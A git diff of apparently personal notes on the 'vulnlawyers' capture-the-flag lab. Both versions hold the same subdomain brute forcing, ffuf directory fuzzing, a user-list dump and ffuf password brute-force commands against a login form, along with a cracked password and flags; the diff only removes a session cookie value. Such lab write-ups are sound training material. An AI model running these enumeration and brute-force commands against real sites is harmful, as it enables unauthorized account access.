@@ -2,7 +2,7 @@ Domain: vulnlawyers.co.uk
 
 Ip: 68.183.255.206
 
-"Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+"Cookie: "
 
 server: nginx/1.21.1
 
@@ -10,7 +10,7 @@ server: nginx/1.21.1
 
 get url:
 
-curl  http://www.vulnlawyers.co.uk  -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+curl  http://www.vulnlawyers.co.uk  -H "Cookie: "
 
 // ipv4 address to use for dns request: --dns-ipv4-addr
 
@@ -38,7 +38,7 @@ dnsrecon -d vulnlawyers.co.uk -D ~/wordlist/subdomains.txt -t brt
 
 Contents discovery:
 
-ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://vulnlawyers.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+ffuf -H "Cookie: " -w ~/wordlists/content.txt -u "http://vulnlawyers.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
 
 //Subpages found: css, denied, images, js, login, 
 
@@ -60,7 +60,7 @@ Access is denied from your ip address.
 
 -----/login------
 
-curl  http://www.vulnlawyers.co.uk /login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+curl  http://www.vulnlawyers.co.uk /login -H "Cookie:"
 
 #2 FLAG found
 
@@ -80,13 +80,13 @@ Content type: application/x-www-form-urlencoded
 
 
 
-ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=admin@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
+ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie:" -w ~/wordlists/passwords.txt -d "email=admin@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
 
 
 
 //Multiple option:
 
-ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/usernames.txt:FUZZ1 -w ~/wordlists/passwords.txt:FUZZ2 -d "email=FUZZ1@&vulnlawyers.co.uk&password=FUZZ2" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
+ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: " -w ~/wordlists/usernames.txt:FUZZ1 -w ~/wordlists/passwords.txt:FUZZ2 -d "email=FUZZ1@&vulnlawyers.co.uk&password=FUZZ2" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
 
 
 
@@ -94,16 +94,16 @@ ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfcha
 
 Contents discovery for subdomain:
 
-ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "data.vulnlawyers.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result.txt
+ffuf -H "Cookie: " -w ~/wordlists/content.txt -u "data.vulnlawyers.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result.txt
 //contents found: users
-curl  http://data.vulnlawyers.co.uk/users -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+curl  http://data.vulnlawyers.co.uk/users -H "Cookie: "
 {"users":[{"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk"},{"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk"},{"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk"},{"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk"},{"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk"}],"flag":"[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^]"}
 #3 FLAG Found
 
 -----------------------------------
 
 //Fuzzing all users with ffuf. Found password for Jaskaran Lowe. Password: summer.
-ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=jaskaran.lowe@vulnlawyers.co.uk@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
+ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: " -w ~/wordlists/passwords.txt -d "email=jaskaran.lowe@vulnlawyers.co.uk@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
 #4 FLAG Found
 
 -----------------------------------
